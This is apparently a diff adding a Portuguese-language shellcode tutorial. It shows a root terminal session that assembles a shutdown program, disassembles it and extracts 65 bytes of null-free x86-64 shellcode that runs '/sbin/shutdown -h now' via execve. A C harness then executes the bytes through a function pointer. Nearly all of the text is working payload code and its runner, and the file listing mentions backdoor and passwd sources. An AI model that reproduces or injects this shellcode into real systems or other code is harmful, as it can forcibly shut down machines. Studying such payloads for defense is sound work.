@@ -1,0 +1,69 @@
+root@ChmoSec:~/Desktop/linux# nasm -f elf64 shutdown.asm 
+root@ChmoSec:~/Desktop/linux# ld shutdown.o -o desligar
+root@ChmoSec:~/Desktop/linux# ls
+a.out         demo.s.save  eu.o        passwd.asm.save  shell.s       vai
+backdoor.asm  desligar     msg.s       passwd.s.save    shutdown.asm
+backdoor.o    eu.asm       msg.s.save  shellcode.sh     shutdown.o
+root@ChmoSec:~/Desktop/linux# objdump -d desligar
+
+desligar:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 <_start>:
+  400080:	48 31 c0             	xor    %rax,%rax
+  400083:	48 31 d2             	xor    %rdx,%rdx
+  400086:	50                   	push   %rax
+  400087:	6a 77                	pushq  $0x77
+  400089:	66 68 6e 6f          	pushw  $0x6f6e
+  40008d:	48 89 e3             	mov    %rsp,%rbx
+  400090:	50                   	push   %rax
+  400091:	66 68 2d 68          	pushw  $0x682d
+  400095:	48 89 e1             	mov    %rsp,%rcx
+  400098:	50                   	push   %rax
+  400099:	49 b8 2f 73 62 69 6e 	movabs $0x2f2f2f6e6962732f,%r8
+  4000a0:	2f 2f 2f 
+  4000a3:	49 ba 73 68 75 74 64 	movabs $0x6e776f6474756873,%r10
+  4000aa:	6f 77 6e 
+  4000ad:	41 52                	push   %r10
+  4000af:	41 50                	push   %r8
+  4000b1:	48 89 e7             	mov    %rsp,%rdi
+  4000b4:	52                   	push   %rdx
+  4000b5:	53                   	push   %rbx
+  4000b6:	51                   	push   %rcx
+  4000b7:	57                   	push   %rdi
+  4000b8:	48 89 e6             	mov    %rsp,%rsi
+  4000bb:	48 83 c0 3b          	add    $0x3b,%rax
+  4000bf:	0f 05                	syscall 
+root@ChmoSec:~/Desktop/linux# ./shellcode.sh desligar 
+"\x48\x31\xc0\x48\x31\xd2\x50\x6a\x77\x66\x68\x6e\x6f\x48\x89\xe3\x50\x66\x68\x2d\x68\x48\
+x89\xe1\x50\x49\xb8\x2f\x73\x62\x69\x6e\x2f\x2f\x2f\x49\xba\x73\x68\x75\x74\x64\x6f\x77\x6e\
+x41\x52\x41\x50\x48\x89\xe7\x52\x53\x51\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
+len:  65
+root@ChmoSec:~/Desktop/linux# 
+Em C fica assim:
+
+==================== Código em C ========================
+#include 
+#include 
+ 
+unsigned char code[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
+"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
+"\x50\x66\x68\x2d\x68\x48\x89\xe1"
+"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
+"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
+"\x74\x64\x6f\x77\x6e\x41\x52\x41"
+"\x50\x48\x89\xe7\x52\x53\x51\x57"
+"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
+"\x05";
+ 
+int
+main() {
+ 
+printf("Shellcode tamanho:  %d\n", (int)strlen(code));
+int (*ret)() = (int(*)())code; // cria ponteiro 
+ret(); 
+ 
+return 0;
+}
